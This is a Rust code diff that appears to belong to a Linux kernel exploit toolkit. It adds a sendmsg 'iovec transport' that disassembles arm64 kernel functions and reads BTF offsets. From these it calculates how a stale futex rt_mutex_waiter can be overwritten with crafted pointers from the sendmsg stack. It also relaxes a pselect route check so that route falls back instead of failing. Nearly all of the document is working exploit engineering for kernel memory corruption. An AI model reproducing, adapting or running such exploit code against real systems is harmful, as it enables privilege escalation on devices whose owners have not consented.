@@ -14,6 +14,8 @@ use crate::error::{ExtractError, Result};
 use crate::kallsyms::unique_or_err;
 
 pub const PSELECT_ROUTE_NFDS: u64 = 320;
+/// UIO_FASTIOV: iovecs import_iovec keeps on the sendmsg stack.
+pub const IOVEC_FASTIOV: u64 = 8;
 pub const OBJDUMP_CAP: usize = 0x2000;
 
 pub type RelSymbols = BTreeMap<String, BTreeSet<u64>>;
@@ -120,6 +122,10 @@ mod tests {
 }
 
 pub struct PselectLayout {
+    /// False when the waiter sits too far above the fd_set for the route to
+    /// reach task/lock; the caller falls back to another transport.
+    pub feasible: bool,
+    pub infeasible_reason: String,
     pub shift: u64,
     pub waiter_local: u64,
     pub pselect_word0: i64,
@@ -363,17 +369,15 @@ pub fn derive_pselect_layout(
         )));
     }
     let shift = (delta / 8) as u64;
-    if shift > 16 {
-        return Err(ExtractError::infeasible(format!(
-            "PSELECT_WAITER_WORD_SHIFT too large: {shift}"
-        )));
-    }
+    let mut feasible = true;
+    let mut infeasible_reason = String::new();
     if shift > 3 {
-        return Err(ExtractError::infeasible(format!(
+        feasible = false;
+        infeasible_reason = format!(
             "futex waiter starts {shift} qwords above the fd_set buffer; \
              task/lock would land outside the user-controlled words 0..14 \
              (max feasible shift is 3)"
-        )));
+        );
     }
     if shift == 3 {
         eprintln!(
@@ -393,6 +397,8 @@ pub fn derive_pselect_layout(
         .collect::<Vec<_>>()
         .join("->");
     Ok(PselectLayout {
+        feasible,
+        infeasible_reason,
         shift,
         waiter_local: *waiter_local,
         pselect_word0,
@@ -401,6 +407,229 @@ pub fn derive_pselect_layout(
         chain,
         futex_chain: futex_chain_str,
         frames,
+    })
+}
+
+/// sendmsg iovec transport. __sys_sendmsg's `struct msghdr` and its eight
+/// fast iovecs sit back to back on the stack; when they cover the stale
+/// futex waiter, one sendmsg rewrites it end to end and import_iovec's
+/// copy-then-validate order leaves the crafted pointers behind.
+pub struct IovecLayout {
+    /// iovstack minus waiter, in bytes.
+    pub waiter_off: i64,
+    pub waiter_depth: i64,
+    pub msghdr_depth: i64,
+    pub iovstack_depth: i64,
+    pub chain: String,
+}
+
+/// Track `add xN, sp, #imm` through moves so a call argument can be resolved
+/// back to a stack local, and record which stack words the prologue zeroes.
+/// Caller-saved registers are dropped at every call.
+struct SpLocals {
+    regs: BTreeMap<String, u64>,
+    stores: BTreeMap<u64, u64>,
+    zeroed: BTreeSet<u64>,
+}
+
+impl SpLocals {
+    fn scan(lines: &[String]) -> Self {
+        let add_sp = Regex::new(r"(?i)^add (x\d+), sp, #0x([0-9a-f]+)$").unwrap();
+        let mov = Regex::new(r"(?i)^mov (x\d+), (x\d+)$").unwrap();
+        let str_sp = Regex::new(r"(?i)^str (x\d+), \[sp, #0x([0-9a-f]+)\]$").unwrap();
+        let zero_one = Regex::new(r"(?i)^str xzr, \[sp, #0x([0-9a-f]+)\]$").unwrap();
+        let zero_pair = Regex::new(r"(?i)^stp xzr, xzr, \[sp, #0x([0-9a-f]+)\]$").unwrap();
+        let mut state = SpLocals {
+            regs: BTreeMap::new(),
+            stores: BTreeMap::new(),
+            zeroed: BTreeSet::new(),
+        };
+        for line in lines {
+            let line = line.trim();
+            if let Some(caps) = zero_one.captures(line) {
+                state.zeroed.insert(u64::from_str_radix(&caps[1], 16).unwrap());
+            } else if let Some(caps) = zero_pair.captures(line) {
+                let base = u64::from_str_radix(&caps[1], 16).unwrap();
+                state.zeroed.insert(base);
+                state.zeroed.insert(base + 8);
+            }
+            if let Some(caps) = add_sp.captures(line) {
+                let imm = u64::from_str_radix(&caps[2], 16).unwrap();
+                state.regs.insert(caps[1].to_string(), imm);
+            } else if let Some(caps) = mov.captures(line) {
+                match state.regs.get(&caps[2]).copied() {
+                    Some(value) => state.regs.insert(caps[1].to_string(), value),
+                    None => state.regs.remove(&caps[1]),
+                };
+            } else if let Some(caps) = str_sp.captures(line) {
+                if let Some(value) = state.regs.get(&caps[1]).copied() {
+                    state
+                        .stores
+                        .insert(u64::from_str_radix(&caps[2], 16).unwrap(), value);
+                }
+            } else if line.starts_with("bl ") {
+                state.regs.retain(|reg, _| {
+                    reg[1..].parse::<u32>().map(|n| (19..=28).contains(&n)) == Ok(true)
+                });
+            }
+        }
+        state
+    }
+}
+
+/// Resolve `add xN, sp, #imm` for the arguments live at one call site.
+fn call_site_locals(lines: &[String], target: u64) -> Result<SpLocals> {
+    let anchor = Regex::new(&format!(r"(?i)^bl 0x{target:x}$")).unwrap();
+    let hits: Vec<usize> = lines
+        .iter()
+        .enumerate()
+        .filter(|(_, line)| anchor.is_match(line.trim()))
+        .map(|(index, _)| index)
+        .collect();
+    if hits.len() != 1 {
+        return Err(ExtractError::new(format!(
+            "call site {target:#x} is not unique: {} hits",
+            hits.len()
+        )));
+    }
+    Ok(SpLocals::scan(&lines[..hits[0]]))
+}
+
+pub fn derive_iovec_layout(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    btf: &Btf,
+    waiter_depth: i64,
+) -> Result<IovecLayout> {
+    let copy_msghdr = unique_offset(symbols, "copy_msghdr_from_user")?;
+    let mut chain = vec!["__arm64_sys_sendmsg"];
+    let mut dis = disassemble_symbol(kernel, symbols, sorted_offsets, chain[0], OBJDUMP_CAP)?;
+    let mut frames = first_sp_frame(&dis, chain[0])?;
+    while !has_direct_call(&dis, copy_msghdr) {
+        let next = ["__sys_sendmsg", "___sys_sendmsg"]
+            .into_iter()
+            .find(|name| {
+                !chain.contains(name)
+                    && unique_offset_optional(symbols, name)
+                        .is_some_and(|addr| has_direct_call(&dis, addr))
+            })
+            .ok_or_else(|| {
+                ExtractError::new(format!(
+                    "{} reaches neither copy_msghdr_from_user nor a sendmsg helper",
+                    chain.last().unwrap()
+                ))
+            })?;
+        chain.push(next);
+        dis = disassemble_symbol(kernel, symbols, sorted_offsets, next, OBJDUMP_CAP)?;
+        frames += first_sp_frame(&dis, next)?;
+    }
+
+    let locals = call_site_locals(&dis, copy_msghdr)?;
+    let msghdr_local = locals.regs.get("x0").copied().ok_or_else(|| {
+        ExtractError::new("copy_msghdr_from_user does not take a stack msghdr")
+    })?;
+    let iovp_local = locals.regs.get("x3").copied().ok_or_else(|| {
+        ExtractError::new("copy_msghdr_from_user does not take a stack iov pointer")
+    })?;
+    let iovstack_local = locals.stores.get(&iovp_local).copied().ok_or_else(|| {
+        ExtractError::new(format!(
+            "the iov pointer at sp+{iovp_local:#x} is never set to a stack iovec array"
+        ))
+    })?;
+
+    let msghdr_depth = frames as i64 - msghdr_local as i64;
+    let iovstack_depth = frames as i64 - iovstack_local as i64;
+    let waiter_off = waiter_depth - iovstack_depth;
+
+    let waiter_field = |name: &str| -> Result<i64> {
+        btf.field("rt_mutex_waiter", name)
+            .map(|value| value as i64)
+            .ok_or_else(|| ExtractError::new(format!("BTF rt_mutex_waiter.{name} missing")))
+    };
+    let lock = waiter_field("lock")?;
+    let ww_ctx = waiter_field("ww_ctx")?;
+
+    // waiter->lock must land on an iov_base slot: copy_iovec_from_user
+    // rejects a negative iov_len, and every kernel pointer is negative.
+    let lock_byte = lock - waiter_off;
+    if lock_byte < 0 || lock_byte % 16 != 0 {
+        return Err(ExtractError::infeasible(format!(
+            "waiter->lock maps to iovstack byte {lock_byte:#x}, which is not an \
+             iov_base slot (iovstack is {waiter_off:#x} above the waiter)"
+        )));
+    }
+    if ww_ctx - waiter_off + 8 > (IOVEC_FASTIOV * 16) as i64 {
+        return Err(ExtractError::infeasible(format!(
+            "the waiter tail runs past the {IOVEC_FASTIOV} fast iovecs \
+             (iovstack is {waiter_off:#x} above the waiter)"
+        )));
+    }
+
+    // Everything below the iovstack comes from the msghdr the kernel just
+    // zeroed, plus the iov pointer slot import_iovec clears on failure. The
+    // rb_node words must not pick up msg_name (a kernel pointer) or the
+    // msg_control_is_user word (always 1).
+    let msg_name = btf
+        .field("msghdr", "msg_name")
+        .ok_or_else(|| ExtractError::new("BTF msghdr.msg_name missing"))? as i64;
+    let msg_is_user = btf
+        .field("msghdr", "msg_control_is_user")
+        .ok_or_else(|| ExtractError::new("BTF msghdr.msg_control_is_user missing"))?
+        as i64
+        & !7;
+    let msghdr_size = btf
+        .size("msghdr")
+        .ok_or_else(|| ExtractError::new("BTF msghdr size missing"))? as i64;
+    let iovp_depth = frames as i64 - iovp_local as i64;
+    for (name, off) in [
+        ("tree.rb_parent_color", 0i64),
+        ("tree.rb_right", 8),
+        ("tree.rb_left", 16),
+    ] {
+        let byte = off - waiter_off;
+        if byte >= 0 {
+            continue; // inside the iovstack, so fully ours
+        }
+        let depth = waiter_depth - off;
+        if depth == iovp_depth {
+            continue; // import_iovec NULLs it on the error path
+        }
+        let field = msghdr_depth - depth;
+        if field < 0 || field >= msghdr_size {
+            return Err(ExtractError::infeasible(format!(
+                "waiter->{name} is covered by neither the msghdr nor the iovstack"
+            )));
+        }
+        if field == msg_name || field == msg_is_user {
+            return Err(ExtractError::infeasible(format!(
+                "waiter->{name} lands on msghdr+{field:#x}, which is never zero"
+            )));
+        }
+        if !locals.zeroed.contains(&((frames as i64 - depth) as u64)) {
+            return Err(ExtractError::infeasible(format!(
+                "waiter->{name} lands on msghdr+{field:#x}, which the prologue \
+                 leaves uninitialised (no CONFIG_INIT_STACK_ALL_ZERO?)"
+            )));
+        }
+    }
+
+    // The iovecs the vector does not reach must still read back as zero.
+    for word in (0..IOVEC_FASTIOV * 16).step_by(8) {
+        if !locals.zeroed.contains(&(iovstack_local + word)) {
+            return Err(ExtractError::infeasible(format!(
+                "the prologue leaves iovstack+{word:#x} uninitialised \
+                 (no CONFIG_INIT_STACK_ALL_ZERO?)"
+            )));
+        }
+    }
+
+    Ok(IovecLayout {
+        waiter_off,
+        waiter_depth,
+        msghdr_depth,
+        iovstack_depth,
+        chain: chain.join("->"),
     })
 }
 
